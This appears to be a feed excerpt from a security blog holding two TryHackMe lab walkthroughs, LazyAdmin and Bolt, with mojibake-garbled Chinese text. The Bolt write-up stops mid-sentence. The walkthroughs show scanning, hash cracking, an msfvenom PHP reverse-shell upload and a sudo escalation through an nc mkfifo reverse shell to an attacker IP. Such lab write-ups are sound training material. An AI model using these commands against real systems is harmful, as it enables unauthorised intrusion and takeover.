    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.36.50</p><p>æ”»å‡»æœºipï¼š10.11.101.220</p></blockquote><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC 10.10.36.50 -o out.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 13:28:01 2024 as: nmap -sS -sV -sC -o out.txt 10.10.36.50</span><br><span class="line">Nmap scan report for 10.10.36.50</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)</span><br><span class="line">|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)</span><br><span class="line">|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 13:28:39 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°åªæœ‰ 22ç«¯å£å’Œ80ç«¯å£å¼€æ”¾</p><h2 id="80ç«¯å£æ¢æµ‹"><a href="#80ç«¯å£æ¢æµ‹" class="headerlink" title="80ç«¯å£æ¢æµ‹"></a>80ç«¯å£æ¢æµ‹</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001133324081-920118799.png" alt="image-20241001133315429"></p><p>80ç«¯å£æ˜¯ä¸€ä¸ªapacheåˆå§‹é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæ‰«æä¸€ä¸‹ç›®å½•</p><p><code>gobuster dir -u http://10.10.36.50/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001134445161-1128622157.png" alt="image-20241001134437572"></p><p>å‘ç°<code>/content</code>è·¯ç”±ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140344879-280931777.png" alt="image-20241001140337721"></p><p>å‘ç°æ˜¯<code>SweetRice</code>ç«™ç‚¹ï¼Œç»§ç»­æ‰«æç›®å½•</p><p><code>gobuster dir -u http://10.10.36.50/content -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140558172-1591267814.png" alt="image-20241001140550777"></p><p>è¿™å›å‘ç°äº†ä¸€äº›æœ‰æ„æ€çš„å†…å®¹</p><p>åœ¨<code>/_themes</code>ä¸‹ï¼Œå‘ç°ä¸€äº›æŸ¥çœ‹ä¸äº†æºç çš„phpæ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140738542-1427503327.png" alt="image-20241001140731314"></p><p>åœ¨<code>/as</code>è·¯ç”±ä¸‹æ‰¾åˆ°ç™»å½•å£</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140820110-1638822951.png" alt="image-20241001140813239"></p><p><code>/attachment</code>è·¯ç”±ä¸‹å¹¶æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140902177-336260211.png" alt="image-20241001140855448"></p><p>è¿™é‡Œç›´æ¥çœ‹<code>/inc</code>è·¯ç”±</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141015730-1826348733.png" alt="image-20241001141008810"></p><p>å¾ˆæ˜æ˜¾çœ‹åˆ°æ•°æ®åº“å¤‡ä»½æ–‡ä»¶å¤¹ï¼Œå°†é‡Œé¢çš„<code>sql</code>æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141141471-910671197.png" alt="image-20241001141134169"></p><p>å‘ç°è¯¥cmsç‰ˆæœ¬ä¸º1.5.1ï¼Œä¸”å¯†ç ä¹Ÿæœ‰ï¼Œç”¨æˆ·åæ˜¯<code>manager</code>ï¼Œå°è¯•hashcatç ´è§£å¯†ç ï¼Œå°†å¯†ç ä¿å­˜ä¸º<code>passwd</code></p><p><code>hashcat -a 0 -m 0 passwd /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141730815-751946977.png" alt="image-20241001141723708"></p><p>å‘ç°æˆåŠŸç ´è§£å¯†ç ï¼Œå¯†ç æ˜¯<code>Password123</code></p><p>å°è¯•é€šè¿‡<code>as</code>è·¯ç”±ç™»å½•<code>manager</code>è´¦æˆ·</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141932514-1784118097.png" alt="image-20241001141925338"></p><p>ç™»å½•æˆåŠŸï¼ŒåŒæ—¶å¯ä»¥ç¡®è®¤è¯¥cmsç‰ˆæœ¬å·ä¸º1.5.1</p><h1 id="MSFè·å–æƒé™"><a href="#MSFè·å–æƒé™" class="headerlink" title="MSFè·å–æƒé™"></a>MSFè·å–æƒé™</h1><p>å¯åŠ¨msfï¼Œ<code>search</code>ä¸€ä¸‹è¯¥cmsï¼Œçœ‹çœ‹èƒ½å¦æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142416137-2123494996.png" alt="image-20241001142409002"></p><p>å¾ˆå¯æƒœï¼Œæ²¡æœ‰å¯ä»¥ç›´æ¥ç”¨çš„ï¼Œä½†æ˜¯<code>searchsploit</code>å‘ç°äº†å¯ä»¥åˆ©ç”¨çš„ï¼Œå…¶ä¸­<code>Backup Disclosure</code>æˆ‘ä»¬ä¹‹å‰æ‰‹åŠ¨å®ç°äº†ï¼Œå¹¶ç™»é™†åˆ°äº†åå°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142447599-1728977571.png" alt="image-20241001142440531"></p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä»–çš„ï¼Œæ¯”å¦‚<code>Arbitrary File Upload</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´ä¸Šä¼ shellï¼Œè¿™é‡Œä½¿ç”¨msfè¿›è¡Œåå¼¹shell</p><p>å…ˆä½¿ç”¨msfåˆ›å»ºä¸€ä¸ªç›‘å¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# ä½¿ç”¨ exploit/multi/handler æ¨¡å—</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# è®¾ç½®phpçš„æ”»å‡»è´Ÿè½½payload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143752057-1728671297.png" alt="image-20241001143744773"></p><p>å°†éœ€è¦çš„é€‰é¡¹å¡«å¥½</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143817667-1736957141.png" alt="image-20241001143810923"></p><p>è®¾ç½®å¥½ç›‘å¬å™¨åï¼Œç”Ÿæˆphpåå¼¹shell</p><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.101.220   lport=4444 R&gt;shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001144930162-200383647.png" alt="image-20241001144922924"></p><p>åœ¨<code>http://10.10.36.50/content/as/?type=media_center</code>å¤„ï¼Œå°†æ–‡ä»¶ä¼ ä¸Šå»</p><p>ä¼ <code>.php</code>æ–‡ä»¶æ—¶ï¼Œå‘ç°å¹¶æ²¡æœ‰ååº”ï¼Œå°†æ–‡ä»¶åç¼€æ”¹ä¸º<code>.phtml</code>ï¼ŒæˆåŠŸä¸Šä¼ </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001145344237-1734699769.png" alt="image-20241001145337432"></p><p>åœ¨msfä¸­<code>run</code>æ‰§è¡Œï¼Œåœ¨ç‚¹å‡»å½“å‰é¡µé¢çš„<code>shell.phtml</code>æ–‡ä»¶ï¼Œæ­¤æ—¶å‘ç°shellæˆåŠŸå¼¹å›æ¥äº†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150642271-505446254.png" alt="image-20241001150634947"></p><p>æ¢æˆäº¤äº’å¼shell</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150826924-1862349482.png" alt="image-20241001150820149"></p><p>åœ¨<code>/home/itguy</code>ä¸‹æ‰¾åˆ°<code>user.txt</code></p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>è¾“å…¥<code>sudo -l</code>æŸ¥çœ‹æ˜¯å¦æœ‰å¯ä»¥åˆ©ç”¨äº†å‘½ä»¤</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151250536-1508069797.png" alt="image-20241001151243232"></p><p>åªå‘ç°äº†ä¸€æ¡</p><p><code>(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl</code></p><p>æŸ¥çœ‹ä¸€ä¸‹<code>backup.pl</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151400028-565050480.png" alt="image-20241001151353310"></p><p>å‘ç°åªæ˜¯è°ƒç”¨<code>/etc/copy.sh</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151602948-2027858445.png" alt="image-20241001151555700"></p><p>é€šè¿‡ä»”ç»†æŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶åå‘ç°ï¼Œæˆ‘ä»¬ä¸èƒ½ä¿®æ”¹<code>backup.pl</code>ä½†æ˜¯å¯ä»¥æ”¹<code>/etc/copy.sh</code>æ–‡ä»¶çš„å†…å®¹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151800210-1044518594.png" alt="image-20241001151753242"></p><p>æŸ¥çœ‹<code>/etc/copy.sh</code>æ–‡ä»¶åå‘ç°ï¼Œå†…å®¹æ˜¯åå¼¹shellçš„å‘½ä»¤ï¼Œå°†å…¶ä¿®æ”¹æˆè‡ªå·±çš„ipå’Œport</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/copy.sh</code></p><p>å¦èµ·ä¸€ä¸ªç›‘å¬</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153450910-287086362.png" alt="image-20241001153444215"></p><p>åœ¨msfç»ˆç«¯shellé‡Œæ‰§è¡Œå‘½ä»¤</p><p><code>sudo /usr/bin/perl /home/itguy/backup.pl</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153547891-1980282670.png" alt="image-20241001153541191"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153900832-1299349622.png" alt="image-20241001153853757"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ–°çš„shellé‡Œè·å¾—äº†rootæƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153956587-989090601.png" alt="image-20241001153949813"></p><p>æœ€ååœ¨<code>/root</code>ä¸‹æ‰¾åˆ°<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeç³»åˆ—ä¹‹LazyAdmin</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Bolt</title>
    <link href="https://www.fomal.cc/posts/a58b6669.html"/>
    <id>https://www.fomal.cc/posts/a58b6669.html</id>
    <published>2024-10-01T02:07:48.000Z</published>
    <updated>2024-10-06T08:25:34.002Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p> é¶æœºipï¼š10.10.48.19</p><p>æ”»å‡»æœºipï¼š10.11.101.220</p></blockquote><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC 10.10.48.19</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 10:13:36 2024 as: nmap -sS -sV -sC -o out.txt 10.10.48.19</span><br><span class="line">Nmap scan report for 10.10.48.19</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)</span><br><span class="line">|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)</span><br><span class="line">|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">8000/tcp open  http    (PHP 7.2.32-1)</span><br><span class="line">|_http-title: Bolt | A hero is unleashed</span><br><span class="line">|_http-generator: Bolt</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">|     Cache-Control: private, must-revalidate</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     pragma: no-cache</span><br><span class="line">|     expires: -1</span><br><span class="line">|     X-Debug-Token: 5d427e</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span><br><span class="line">|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;generator&quot; content=&quot;Bolt&quot;&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     href=&quot;#main-content&quot; class=&quot;vis</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">|     Cache-Control: public, s-maxage=600</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     X-Debug-Token: cc4424</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en-GB&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span><br><span class="line">|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;generator&quot; content=&quot;Bolt&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;canonical&quot; href=&quot;http://0.0.0.0:8000/&quot;&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|_    &lt;body class=&quot;front&quot;&gt;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8000-TCP:V=7.94SVN%I=7%D=10/1%Time=66FB5AEF%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GetRequest,29E1,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Tue,\x2001\x20Oct\</span><br><span class="line">SF:x202024\x2002:14:09\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20</span><br><span class="line">SF:PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x2</span><br><span class="line">SF:0public,\x20s-maxage=600\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x2002:14</span><br><span class="line">SF::09\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-T</span><br><span class="line">SF:oken:\x20cc4424\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=\&quot;en-GB\&quot;&gt;\n\x</span><br><span class="line">SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20charset=</span><br><span class="line">SF:\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\</span><br><span class="line">SF:x20content=\&quot;width=device-width,\x20initial-scale=1\.0\&quot;&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Bolt\x20\|\x</span><br><span class="line">SF:20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20href=\&quot;https://fonts\.googleapis\.com/css\?family=Bitter\|Rob</span><br><span class="line">SF:oto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/bulma\.c</span><br><span class="line">SF:ss\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;style</span><br><span class="line">SF:sheet\&quot;\x20href=\&quot;/theme/base-2018/css/theme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20\t&lt;link\x20rel=\&quot;canonical\&quot;\x20href=\&quot;http://0\.0\.0\.0:8000/\</span><br><span class="line">SF:&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body\x20class=\&quot;front\&quot;&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20&quot;)%r(FourOhFourRequest,1527,&quot;HTT</span><br><span class="line">SF:P/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x20</span><br><span class="line">SF:02:14:09\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.3</span><br><span class="line">SF:2-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x</span><br><span class="line">SF:20must-revalidate\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x2002:14:09\x20</span><br><span class="line">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-ca</span><br><span class="line">SF:che\r\nexpires:\x20-1\r\nX-Debug-Token:\x205d427e\r\n\r\n&lt;!doctype\x20h</span><br><span class="line">SF:tml&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20init</span><br><span class="line">SF:ial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20&lt;title&gt;Bolt\x20\|\x20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20href=\&quot;https://fonts\.googleap</span><br><span class="line">SF:is\.com/css\?family=Bitter\|Roboto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;</span><br><span class="line">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=</span><br><span class="line">SF:\&quot;/theme/base-2018/css/bulma\.css\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/t</span><br><span class="line">SF:heme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;</span><br><span class="line">SF:\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;#main-content\&quot;\x20class=</span><br><span class="line">SF:\&quot;vis&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 10:14:51 2024 -- 1 IP address (1 host up) scanned in 75.38 seconds</span><br></pre></td></tr></table></figure><p>è®¿é—®åå‘ç°ï¼Œåœ¨80ç«¯å£å­˜åœ¨<code>apache</code>é»˜è®¤é¡µé¢ï¼Œåœ¨8000ç«¯å£è¿è¡Œç€<code>Bolt CMS</code></p><h2 id="Bolt-CMS"><a href="#Bolt-CMS" class="headerlink" title="Bolt CMS"></a>Bolt CMS</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001102149429-713047204.png" alt="image-20241001102140990"></p><p>åœ¨é¡µé¢æ‰¾åˆ°ç”¨æˆ·åå’Œå¯†ç <code>bolt : boltadmin123</code></p><p>ç½‘ä¸Šæœç´¢å‘ç°è¯¥CMSé»˜è®¤ç™»å½•è·¯ç”±æ˜¯<code>/bolt</code>ï¼Œåˆ©ç”¨åˆšæ‰è·å¾—çš„ç”¨æˆ·åå¯†ç ç™»å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001103519405-1390007359.png" alt="image-20241001103512011"></p><p>ç™»å½•æˆåŠŸåå‘ç°è¯¥ç‰ˆæœ¬ä¸º<code>3.7.1</code></p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>é€šè¿‡<code>searchsploit</code>æŸ¥æ‰¾åå‘ç°æ—©æœŸçš„RCEæ¼æ´</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001103939174-1828313295.png" alt="image-20241001103932318"></p><p>ä¸ºäº†æ–¹ä¾¿åç»­æ“ä½œï¼Œè¿™é‡Œä½¿ç”¨msfè¿›è¡Œæ”»å‡»</p><p>é€šè¿‡<code>msfconsole</code>å¯åŠ¨msfåï¼Œä½¿ç”¨searchå‘½ä»¤è¿›è¡ŒæŸ¥è¯¢</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104037415-657957668.png" alt="image-20241001104030417"></p><p>ä½¿ç”¨<code>use 0</code>å‘½ä»¤ä½¿ç”¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104202808-726963840.png" alt="image-20241001104155662"></p><p>è¾“å…¥<code>show 